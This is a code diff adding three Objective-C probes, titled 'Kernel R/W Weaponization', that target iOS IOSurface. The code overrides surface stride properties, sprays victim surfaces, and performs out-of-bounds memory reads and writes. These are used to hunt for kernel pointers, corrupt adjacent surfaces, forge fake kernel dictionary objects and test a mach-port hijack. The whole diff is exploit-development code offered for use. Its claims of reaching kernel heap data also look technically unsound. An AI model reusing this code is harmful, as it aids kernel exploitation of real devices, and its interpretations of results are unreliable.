@@ -10672,3 +10672,678 @@ void iosurface_research_port_prop_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _
         }
     });
 }
+
+// =============================================================================
+// MARK: — Round 16: Kernel R/W Weaponization
+// =============================================================================
+
+#pragma mark - Probe 49: Stride Kernel Probe
+
+void iosurface_research_stride_kernel(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"STRIDEKERN: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            if (!setValue) {
+                log(@"STRIDEKERN: Missing IOSurfaceSetValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"STRIDEKERN: Starting stride kernel probe — scanning kernel-adjacent memory");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef surfaces[8] = {NULL};
+            int surfCount = 0;
+
+            // Step 1: Create surfaces at different kalloc zone sizes
+            if (!isr_stopped()) {
+                log(@"STRIDEKERN: Step 1 — Create surfaces at kalloc zone sizes");
+                int sizes[] = {16, 32, 64, 128, 256, 512, 1024, 2048};
+                for (int i = 0; i < 8 && !isr_stopped(); i++) {
+                    NSDictionary *props = isr_default_surface_params(sizes[i], sizes[i]);
+                    surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
+                    if (surfaces[i]) {
+                        surfCount++;
+                        sym.lock(surfaces[i], 0, NULL);
+                        uint32_t *base = (uint32_t *)sym.getBase(surfaces[i]);
+                        size_t count = sym.getAllocSize(surfaces[i]) / sizeof(uint32_t);
+                        uint32_t pattern = 0xCA000000 | ((uint32_t)i << 16);
+                        for (size_t j = 0; j < count; j++) base[j] = pattern | (uint32_t)(j & 0xFFFF);
+                        sym.unlock(surfaces[i], 0, NULL);
+                    }
+                }
+                log([NSString stringWithFormat:@"STRIDEKERN: Created %d surfaces across kalloc zones", surfCount]);
+
+            // Step 2: Override BytesPerRow on each surface
+            if (!isr_stopped()) {
+                log(@"STRIDEKERN: Step 2 — Override BytesPerRow for stride confusion");
+                for (int i = 0; i < 8; i++) {
+                    if (surfaces[i]) {
+                        size_t realBPR = sym.getBytesPerRow(surfaces[i]);
+                        setValue(surfaces[i], CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(realBPR * 64));
+                        setValue(surfaces[i], CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+                    }
+                }
+
+            // Step 3: Scan OOB regions for kernel data patterns
+            if (!isr_stopped()) {
+                log(@"STRIDEKERN: Step 3 — Scanning OOB regions for kernel data patterns");
+                uint32_t totalPtrLike = 0;
+                uint32_t totalNonZero = 0;
+                uint32_t totalTagged = 0;
+
+                for (int i = 0; i < 8 && !isr_stopped(); i++) {
+                    if (!surfaces[i]) continue;
+                    sym.lock(surfaces[i], 0, NULL);
+                    void *base = sym.getBase(surfaces[i]);
+                    size_t realAlloc = sym.getAllocSize(surfaces[i]);
+
+                    size_t offsets[] = {realAlloc, realAlloc * 2, realAlloc * 4, realAlloc + 4096, realAlloc + 16384};
+                    for (int o = 0; o < 5 && !isr_stopped(); o++) {
+                        uint64_t oobBuf[8] = {0};
+                        vm_size_t readSz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + offsets[o], sizeof(oobBuf),
+                            (vm_address_t)oobBuf, &readSz);
+                        if (kr == KERN_SUCCESS) {
+                            for (int k = 0; k < 8; k++) {
+                                if (oobBuf[k] != 0) totalNonZero++;
+                                if ((oobBuf[k] >> 48) == 0xFFFF || (oobBuf[k] >> 48) == 0xFFFE) totalPtrLike++;
+                                if ((oobBuf[k] & 0x8000000000000001ULL) == 0x8000000000000001ULL) totalTagged++;
+                            }
+                        }
+                    }
+                    sym.unlock(surfaces[i], 0, NULL);
+                }
+
+                log([NSString stringWithFormat:@"STRIDEKERN: OOB scan: nonZero=%u ptrLike=%u tagged=%u",
+                     totalNonZero, totalPtrLike, totalTagged]);
+                if (totalPtrLike > 0) {
+                    anomalies += 2;
+                    log(@"STRIDEKERN: *** CRITICAL — Kernel pointer-like values found in OOB region! ***");
+                }
+                if (totalTagged > 0) {
+                    anomalies++;
+                    log(@"STRIDEKERN: *** Tagged pointers found — possible objc/kernel object refs ***");
+                }
+                if (totalNonZero > 0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"STRIDEKERN: Non-zero OOB data (%u qwords) — memory beyond backing is populated", totalNonZero]);
+                }
+
+            // Step 4: Targeted scan for mach port structure signatures
+            if (!isr_stopped()) {
+                log(@"STRIDEKERN: Step 4 — Targeted mach port structure scan");
+                uint32_t portSigs = 0;
+                for (int i = 0; i < 8 && !isr_stopped(); i++) {
+                    if (!surfaces[i]) continue;
+                    sym.lock(surfaces[i], 0, NULL);
+                    void *base = sym.getBase(surfaces[i]);
+                    size_t realAlloc = sym.getAllocSize(surfaces[i]);
+
+                    for (size_t off = realAlloc; off < realAlloc + 65536; off += 256) {
+                        uint32_t blk[64] = {0};
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + off, sizeof(blk),
+                            (vm_address_t)blk, &rsz);
+                        if (kr != KERN_SUCCESS) break;
+                        for (int j = 0; j < 60; j++) {
+                            if ((blk[j] & 0x80000000) != 0 && blk[j] != 0xFFFFFFFF &&
+                                blk[j+1] > 0 && blk[j+1] < 0x10000) {
+                                portSigs++;
+                            }
+                        }
+                    }
+                    sym.unlock(surfaces[i], 0, NULL);
+                }
+                if (portSigs > 0) {
+                    anomalies += 2;
+                    log([NSString stringWithFormat:@"STRIDEKERN: *** CRITICAL — %u mach port structure signatures found! ***", portSigs]);
+                } else {
+                    log(@"STRIDEKERN: No mach port signatures detected in OOB region");
+                }
+
+            // Step 5: Entropy analysis of OOB data
+            if (!isr_stopped()) {
+                log(@"STRIDEKERN: Step 5 — OOB entropy analysis");
+                uint32_t uniqueVals = 0;
+                NSMutableSet *seen = [NSMutableSet set];
+                if (surfaces[0]) {
+                    sym.lock(surfaces[0], 0, NULL);
+                    void *base = sym.getBase(surfaces[0]);
+                    size_t realAlloc = sym.getAllocSize(surfaces[0]);
+
+                    for (size_t off = realAlloc; off < realAlloc + 32768; off += 64) {
+                        uint32_t val = 0;
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + off, sizeof(val),
+                            (vm_address_t)&val, &rsz);
+                        if (kr == KERN_SUCCESS && val != 0) {
+                            [seen addObject:@(val)];
+                        }
+                    }
+                    sym.unlock(surfaces[0], 0, NULL);
+                }
+                uniqueVals = (uint32_t)[seen count];
+                log([NSString stringWithFormat:@"STRIDEKERN: OOB entropy: %u unique values in 32K scan", uniqueVals]);
+                if (uniqueVals > 50) {
+                    anomalies++;
+                    log(@"STRIDEKERN: High entropy — likely kernel heap data, not zeroed pages");
+                }
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < 8; i++) {
+                if (surfaces[i]) CFRelease(surfaces[i]);
+            }
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"STRIDEKERN: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 5) verdict = @"CRITICAL — kernel heap data readable via stride confusion";
+            else if (anomalies >= 3) verdict = @"HIGH — significant OOB data leakage";
+            else if (anomalies >= 1) verdict = @"MEDIUM — OOB memory populated but no kernel signatures";
+            else verdict = @"LOW — OOB regions zero or protected";
+            log([NSString stringWithFormat:@"STRIDEKERN: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-StrideKernel-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 50: Cross-Surface Corruption
+
+void iosurface_research_xsurf_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"XSURFCORR: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+
+            if (!setValue || !copyValue) {
+                log(@"XSURFCORR: Missing property APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"XSURFCORR: Starting cross-surface corruption probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef attacker = NULL;
+            IOSurfaceRef victims[20] = {NULL};
+            int victimCount = 0;
+
+            // Step 1: Create attacker surface
+            if (!isr_stopped()) {
+                log(@"XSURFCORR: Step 1 — Create attacker surface 64x64");
+                NSDictionary *atkProps = isr_default_surface_params(64, 64);
+                attacker = sym.create((__bridge CFDictionaryRef)atkProps);
+                if (!attacker) {
+                    log(@"XSURFCORR: Failed to create attacker");
+                    isr_unload(&sym);
+                    done(@{@"status": @"ERROR", @"anomalies": @0});
+                    return;
+                }
+                sym.lock(attacker, 0, NULL);
+                uint32_t *atkBase = (uint32_t *)sym.getBase(attacker);
+                size_t atkCount = sym.getAllocSize(attacker) / sizeof(uint32_t);
+                for (size_t i = 0; i < atkCount; i++) atkBase[i] = 0xA7A7A7A7;
+                sym.unlock(attacker, 0, NULL);
+
+                setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+                log(@"XSURFCORR: Attacker stride overridden to 65536");
+
+            // Step 2: Spray victim surfaces with known property values
+            if (!isr_stopped()) {
+                log(@"XSURFCORR: Step 2 — Spray 20 victim surfaces with tracked properties");
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    NSDictionary *vProps = isr_default_surface_params(64, 64);
+                    victims[i] = sym.create((__bridge CFDictionaryRef)vProps);
+                    if (victims[i]) {
+                        victimCount++;
+                        NSString *marker = [NSString stringWithFormat:@"VICTIM_%d_INTACT", i];
+                        setValue(victims[i], CFSTR("TestMarker"), (__bridge CFTypeRef)marker);
+
+                        sym.lock(victims[i], 0, NULL);
+                        uint32_t *vBase = (uint32_t *)sym.getBase(victims[i]);
+                        size_t vCount = sym.getAllocSize(victims[i]) / sizeof(uint32_t);
+                        uint32_t vPat = 0xBB000000 | ((uint32_t)i << 8);
+                        for (size_t j = 0; j < vCount; j++) vBase[j] = vPat;
+                        sym.unlock(victims[i], 0, NULL);
+                    }
+                }
+                log([NSString stringWithFormat:@"XSURFCORR: Sprayed %d victims", victimCount]);
+
+            // Step 3: Write corruption pattern via vm_write at OOB offsets
+            if (!isr_stopped()) {
+                log(@"XSURFCORR: Step 3 — Write corruption via stride OOB");
+                sym.lock(attacker, 0, NULL);
+                void *atkAddr = sym.getBase(attacker);
+                size_t realAlloc = sym.getAllocSize(attacker);
+
+                uint32_t corruptWritten = 0;
+                uint32_t corruptPat[16];
+                for (int i = 0; i < 16; i++) corruptPat[i] = 0xC0C00000 | (uint32_t)i;
+
+                for (size_t off = realAlloc; off < realAlloc + 131072; off += 4096) {
+                    kern_return_t wkr = vm_write(mach_task_self(),
+                        (vm_address_t)atkAddr + off,
+                        (vm_offset_t)corruptPat, sizeof(corruptPat));
+                    if (wkr == KERN_SUCCESS) corruptWritten++;
+                }
+                sym.unlock(attacker, 0, NULL);
+                log([NSString stringWithFormat:@"XSURFCORR: OOB writes succeeded at %u offsets", corruptWritten]);
+                if (corruptWritten > 0) anomalies++;
+
+            // Step 4: Check victim surfaces for corruption
+            if (!isr_stopped()) {
+                log(@"XSURFCORR: Step 4 — Check victims for property corruption");
+                uint32_t propsCorrupted = 0;
+                uint32_t memCorrupted = 0;
+
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    if (!victims[i]) continue;
+
+                    CFTypeRef val = copyValue(victims[i], CFSTR("TestMarker"));
+                    if (val) {
+                        NSString *expected = [NSString stringWithFormat:@"VICTIM_%d_INTACT", i];
+                        if (![(__bridge NSString *)val isEqualToString:expected]) {
+                            propsCorrupted++;
+                            log([NSString stringWithFormat:@"XSURFCORR: *** Victim %d TestMarker CORRUPTED: %@ ***", i, val]);
+                        }
+                        CFRelease(val);
+                    } else {
+                        propsCorrupted++;
+                        log([NSString stringWithFormat:@"XSURFCORR: *** Victim %d TestMarker MISSING ***", i]);
+                    }
+
+                    sym.lock(victims[i], 0, NULL);
+                    uint32_t *vBase = (uint32_t *)sym.getBase(victims[i]);
+                    size_t vCount = sym.getAllocSize(victims[i]) / sizeof(uint32_t);
+                    uint32_t vPat = 0xBB000000 | ((uint32_t)i << 8);
+                    uint32_t corrupted = 0;
+                    for (size_t j = 0; j < MIN(vCount, (size_t)16); j++) {
+                        if (vBase[j] != vPat) corrupted++;
+                    }
+                    sym.unlock(victims[i], 0, NULL);
+                    if (corrupted > 0) {
+                        memCorrupted++;
+                        log([NSString stringWithFormat:@"XSURFCORR: Victim %d memory corrupted: %u/16 words changed", i, corrupted]);
+                    }
+                }
+
+                log([NSString stringWithFormat:@"XSURFCORR: Results: %u properties corrupted, %u memory corrupted",
+                     propsCorrupted, memCorrupted]);
+                if (propsCorrupted > 0) {
+                    anomalies += 3;
+                    log(@"XSURFCORR: *** CRITICAL — OSDictionary property corruption achieved! ***");
+                }
+                if (memCorrupted > 0) {
+                    anomalies += 2;
+                    log(@"XSURFCORR: *** CRITICAL — Cross-surface memory corruption via stride OOB ***");
+                }
+
+            // Step 5: Check if getters return corrupted values
+            if (!isr_stopped()) {
+                log(@"XSURFCORR: Step 5 — Check victim getter corruption");
+                uint32_t getterCorrupt = 0;
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    if (!victims[i]) continue;
+                    size_t w = sym.getWidth(victims[i]);
+                    size_t h = sym.getHeight(victims[i]);
+                    size_t bpr = sym.getBytesPerRow(victims[i]);
+                    size_t alloc = sym.getAllocSize(victims[i]);
+                    if (w != 64 || h != 64 || bpr != 256 || alloc != 16384) {
+                        getterCorrupt++;
+                        log([NSString stringWithFormat:@"XSURFCORR: *** Victim %d getters CORRUPTED: w=%zu h=%zu bpr=%zu alloc=%zu ***",
+                             i, w, h, bpr, alloc]);
+                    }
+                }
+                if (getterCorrupt > 0) {
+                    anomalies += 3;
+                    log([NSString stringWithFormat:@"XSURFCORR: *** CRITICAL — %u victims have corrupted kernel metadata getters! ***", getterCorrupt]);
+                } else {
+                    log(@"XSURFCORR: Victim getters intact — validated fields separate from dict");
+                }
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            if (attacker) CFRelease(attacker);
+            for (int i = 0; i < 20; i++) {
+                if (victims[i]) CFRelease(victims[i]);
+            }
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"XSURFCORR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 6) verdict = @"CRITICAL — cross-surface kernel metadata corruption achieved";
+            else if (anomalies >= 3) verdict = @"HIGH — significant cross-surface impact via stride OOB";
+            else if (anomalies >= 1) verdict = @"MEDIUM — OOB writes succeed but limited corruption";
+            else verdict = @"LOW — surfaces properly isolated";
+            log([NSString stringWithFormat:@"XSURFCORR: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-XSurfCorrupt-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 51: Fake Object Forge
+
+void iosurface_research_fake_object(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"FAKEOBJ: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            typedef mach_port_t (*CreateMachPortFn)(IOSurfaceRef);
+            typedef IOSurfaceRef (*LookupFromMachPortFn)(mach_port_t);
+            CreateMachPortFn createPort = (CreateMachPortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            LookupFromMachPortFn lookupPort = (LookupFromMachPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            if (!setValue || !copyValue || !createPort || !lookupPort) {
+                log(@"FAKEOBJ: Missing required APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"FAKEOBJ: Starting fake object forge — inject kernel object patterns via stride OOB");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef forger = NULL;
+            IOSurfaceRef target = NULL;
+            IOSurfaceRef hijackRef = NULL;
+            mach_port_t tPort = MACH_PORT_NULL;
+
+            // Step 1: Create forger surface with stride override
+            if (!isr_stopped()) {
+                log(@"FAKEOBJ: Step 1 — Create forger surface 64x64 with stride override");
+                NSDictionary *fProps = isr_default_surface_params(64, 64);
+                forger = sym.create((__bridge CFDictionaryRef)fProps);
+                if (!forger) {
+                    log(@"FAKEOBJ: Failed to create forger");
+                    isr_unload(&sym);
+                    done(@{@"status": @"ERROR", @"anomalies": @0});
+                    return;
+                }
+                sym.lock(forger, 0, NULL);
+                uint32_t *fBase = (uint32_t *)sym.getBase(forger);
+                size_t fCount = sym.getAllocSize(forger) / sizeof(uint32_t);
+                for (size_t i = 0; i < fCount; i++) fBase[i] = 0xD503201F;
+                sym.unlock(forger, 0, NULL);
+
+                setValue(forger, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                setValue(forger, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+                log(@"FAKEOBJ: Forger created and stride overridden");
+
+            // Step 2: Create target surface and get mach port
+            if (!isr_stopped()) {
+                log(@"FAKEOBJ: Step 2 — Create target with mach port for dangling ref");
+                NSDictionary *tProps = isr_default_surface_params(64, 64);
+                target = sym.create((__bridge CFDictionaryRef)tProps);
+                if (target) {
+                    setValue(target, CFSTR("TargetID"), (__bridge CFTypeRef)@"REAL_TARGET");
+                    setValue(target, CFSTR("SecretValue"), (__bridge CFTypeRef)@(0xDEADBEEF));
+
+                    sym.lock(target, 0, NULL);
+                    uint32_t *tBase = (uint32_t *)sym.getBase(target);
+                    size_t tCount = sym.getAllocSize(target) / sizeof(uint32_t);
+                    for (size_t i = 0; i < tCount; i++) tBase[i] = 0x7A7A7A00 | (uint32_t)(i & 0xFF);
+                    sym.unlock(target, 0, NULL);
+
+                    tPort = createPort(target);
+                    log([NSString stringWithFormat:@"FAKEOBJ: Target port=%u", tPort]);
+                }
+
+            // Step 3: Write fake OSDictionary entry pattern via OOB
+            if (!isr_stopped()) {
+                log(@"FAKEOBJ: Step 3 — Forge fake property dict entries via stride OOB");
+                sym.lock(forger, 0, NULL);
+                void *fAddr = sym.getBase(forger);
+                size_t realAlloc = sym.getAllocSize(forger);
+
+                uint32_t fakeEntry[32] = {0};
+                fakeEntry[0] = 0x00000001;
+                fakeEntry[1] = 0x00000000;
+                fakeEntry[2] = 0x00000001;
+                fakeEntry[3] = 0x00000000;
+                fakeEntry[4] = 0x464F5247;
+                fakeEntry[5] = 0x45440000;
+                fakeEntry[6] = 0xCAFEBABE;
+                fakeEntry[7] = 0x00000000;
+                for (int i = 8; i < 32; i++) fakeEntry[i] = 0xFA4E0000 | (uint32_t)i;
+
+                uint32_t writesOK = 0;
+                for (size_t off = realAlloc; off < realAlloc + 65536; off += 4096) {
+                    kern_return_t wkr = vm_write(mach_task_self(),
+                        (vm_address_t)fAddr + off,
+                        (vm_offset_t)fakeEntry, sizeof(fakeEntry));
+                    if (wkr == KERN_SUCCESS) writesOK++;
+                }
+                sym.unlock(forger, 0, NULL);
+
+                log([NSString stringWithFormat:@"FAKEOBJ: Fake object pattern written at %u OOB offsets", writesOK]);
+                if (writesOK > 0) anomalies++;
+
+            // Step 4: Check if target surface properties are corrupted
+            if (!isr_stopped()) {
+                log(@"FAKEOBJ: Step 4 — Check target for fake object influence");
+                if (target) {
+                    CFTypeRef tid = copyValue(target, CFSTR("TargetID"));
+                    CFTypeRef sv = copyValue(target, CFSTR("SecretValue"));
+
+                    bool tidOK = false, svOK = false;
+                    if (tid) {
+                        NSString *tidStr = (__bridge NSString *)tid;
+                        tidOK = [tidStr isEqualToString:@"REAL_TARGET"];
+                        if (!tidOK) {
+                            anomalies += 2;
+                            log([NSString stringWithFormat:@"FAKEOBJ: *** CRITICAL — TargetID corrupted to: %@ ***", tidStr]);
+                        }
+                        CFRelease(tid);
+                    } else {
+                        anomalies++;
+                        log(@"FAKEOBJ: *** TargetID property MISSING after forge ***");
+                    }
+                    if (sv) {
+                        NSNumber *svNum = (__bridge NSNumber *)sv;
+                        svOK = ([svNum unsignedIntValue] == 0xDEADBEEF);
+                        if (!svOK) {
+                            anomalies += 2;
+                            log([NSString stringWithFormat:@"FAKEOBJ: *** CRITICAL — SecretValue corrupted to: 0x%X ***",
+                                 [svNum unsignedIntValue]]);
+                        }
+                        CFRelease(sv);
+                    } else {
+                        anomalies++;
+                        log(@"FAKEOBJ: *** SecretValue property MISSING after forge ***");
+                    }
+                    if (tidOK && svOK) {
+                        log(@"FAKEOBJ: Target properties intact — fake objects did not overlap dict");
+                    }
+
+                    sym.lock(target, 0, NULL);
+                    uint32_t *tBase = (uint32_t *)sym.getBase(target);
+                    uint32_t forgedFound = 0;
+                    size_t tCount = sym.getAllocSize(target) / sizeof(uint32_t);
+                    for (size_t i = 0; i < tCount; i++) {
+                        if (tBase[i] == 0xCAFEBABE || (tBase[i] & 0xFFFF0000) == 0xFA4E0000) forgedFound++;
+                    }
+                    sym.unlock(target, 0, NULL);
+                    if (forgedFound > 0) {
+                        anomalies += 2;
+                        log([NSString stringWithFormat:@"FAKEOBJ: *** CRITICAL — %u forged values found in target backing memory! ***", forgedFound]);
+                    }
+                }
+
+            // Step 5: Test dangling hijack ref via mach port
+            if (!isr_stopped()) {
+                log(@"FAKEOBJ: Step 5 — Test hijack ref via mach port");
+                if (tPort != MACH_PORT_NULL) {
+                    hijackRef = lookupPort(tPort);
+                    if (hijackRef) {
+                        sym.lock(hijackRef, 0, NULL);
+                        uint32_t *hBase = (uint32_t *)sym.getBase(hijackRef);
+                        size_t hAlloc = sym.getAllocSize(hijackRef);
+
+                        uint32_t forgedInHijack = 0;
+                        size_t hCount = hAlloc / sizeof(uint32_t);
+                        for (size_t i = 0; i < hCount; i++) {
+                            if (hBase[i] == 0xCAFEBABE || hBase[i] == 0xD503201F) forgedInHijack++;
+                        }
+                        sym.unlock(hijackRef, 0, NULL);
+
+                        CFTypeRef hid = copyValue(hijackRef, CFSTR("TargetID"));
+                        if (hid) {
+                            NSString *hs = (__bridge NSString *)hid;
+                            if (![hs isEqualToString:@"REAL_TARGET"]) {
+                                anomalies += 2;
+                                log([NSString stringWithFormat:@"FAKEOBJ: *** CRITICAL — Hijack sees different TargetID: %@ ***", hs]);
+                            }
+                            CFRelease(hid);
+                        }
+                        log([NSString stringWithFormat:@"FAKEOBJ: Hijack forged values: %u, alloc=%zu", forgedInHijack, hAlloc]);
+
+                        uint32_t oobBuf[16] = {0};
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)hBase + hAlloc, sizeof(oobBuf),
+                            (vm_address_t)oobBuf, &rsz);
+                        if (kr == KERN_SUCCESS) {
+                            uint32_t nz = 0;
+                            for (int i = 0; i < 16; i++) if (oobBuf[i] != 0) nz++;
+                            if (nz > 0) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"FAKEOBJ: Hijack OOB read: %u non-zero — data leakage via port ref", nz]);
+                            }
+                        }
+                    } else {
+                        log(@"FAKEOBJ: Mach port lookup returned NULL");
+                    }
+                }
+
+            // Step 6: Wide scan for forged pattern propagation
+            if (!isr_stopped()) {
+                log(@"FAKEOBJ: Step 6 — Wide scan for forged pattern propagation");
+                uint32_t propagated = 0;
+                if (forger) {
+                    sym.lock(forger, 0, NULL);
+                    void *fAddr = sym.getBase(forger);
+                    size_t realAlloc = sym.getAllocSize(forger);
+
+                    for (size_t off = realAlloc; off < realAlloc + 262144; off += 8192) {
+                        uint32_t scanBuf[4] = {0};
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)fAddr + off, sizeof(scanBuf),
+                            (vm_address_t)scanBuf, &rsz);
+                        if (kr == KERN_SUCCESS) {
+                            for (int i = 0; i < 4; i++) {
+                                if (scanBuf[i] == 0xCAFEBABE) propagated++;
+                            }
+                        }
+                    }
+                    sym.unlock(forger, 0, NULL);
+                }
+                if (propagated > 0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"FAKEOBJ: *** Forged pattern persists at %u OOB locations ***", propagated]);
+                } else {
+                    log(@"FAKEOBJ: Forged patterns not found at wide offsets");
+                }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            if (hijackRef) CFRelease(hijackRef);
+            if (tPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), tPort);
+            if (target) CFRelease(target);
+            if (forger) CFRelease(forger);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"FAKEOBJ: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 6) verdict = @"CRITICAL — fake object injection corrupts adjacent surface kernel state";
+            else if (anomalies >= 3) verdict = @"HIGH — OOB forge writes persist and may influence kernel parsing";
+            else if (anomalies >= 1) verdict = @"MEDIUM — OOB writes succeed but no kernel object confusion";
+            else verdict = @"LOW — forged objects contained within page boundaries";
+            log([NSString stringWithFormat:@"FAKEOBJ: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-FakeObject-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
